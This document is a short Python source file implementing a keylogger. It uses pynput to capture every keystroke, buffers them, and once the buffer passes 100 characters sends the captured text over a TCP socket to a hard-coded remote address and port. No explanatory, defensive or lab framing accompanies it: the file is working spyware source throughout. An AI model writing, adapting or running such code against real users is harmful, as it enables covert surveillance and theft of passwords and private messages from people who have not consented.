import socket
import pynput.keyboard

class SimpleKeylogger:
    def __init__(self, server_ip, server_port):
        self.logger = ""
        self.server_ip = server_ip
        self.server_port = server_port

    def append_to_log(self, key_strike):
        self.logger += key_strike

    def evaluate_keys(self, key):
        try: 
            pressed_key = key.char
        except AttributeError:
            if key == pynput.keyboard.Key.space:    
                pressed_key = " "
            else:
                pressed_key = " " + str(key) + " "
        self.append_to_log(str(pressed_key))

    def send_log_file(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server_ip, self.server_port))
                s.sendall(self.logger.encode())
                print("Log file sent successfully!")
                self.logger = ""  
        except Exception as e:
            print("Error:", e)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            try:
                while True:
                    if len(self.logger) > 100:  
                        self.send_log_file()
            except KeyboardInterrupt:
                print("Keylogger stopped.")

if __name__ == "__main__":
    server_ip = "192.168.1.169"  
    server_port = 12346 
    keylogger = SimpleKeylogger(server_ip, server_port)
    keylogger.start()
